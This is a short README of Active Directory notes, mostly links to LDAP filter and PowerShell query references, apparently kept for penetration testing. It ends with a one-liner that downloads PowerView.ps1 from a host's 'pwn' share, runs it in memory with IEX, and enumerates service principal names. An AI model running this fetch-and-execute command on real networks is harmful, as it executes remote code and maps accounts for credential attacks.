# ad-scripts-n-bits

LDAP Search Terms & Syntax (Best resource)
- https://social.technet.microsoft.com/wiki/contents/articles/5392.active-directory-ldap-syntax-filters.aspx

Case Studies
- https://www.jaapbrasser.com/tag/ldap-query/

LDAP Filter Syntax
- https://docs.fortinet.com/document/fortiauthenticator/6.0.3/administration-guide/851122/ldap-filter-syntax

Powershell Directory Tree Query Terms
- https://devblogs.microsoft.com/scripting/use-powershell-to-query-active-directory-from-the-console/

Powershell LDAP Query Terms
- https://ldapwiki.com/wiki/Active%20Directory%20Computer%20Related%20LDAP%20Query





Enum SPN's Oneliner SMBv2

```IEX(New-Object Net.webClient).downloadString('\\192.168.119.135\pwn\PowerView.ps1');Get-SPN -type service -search "*" -List yes | Format-Table -AutoSize```
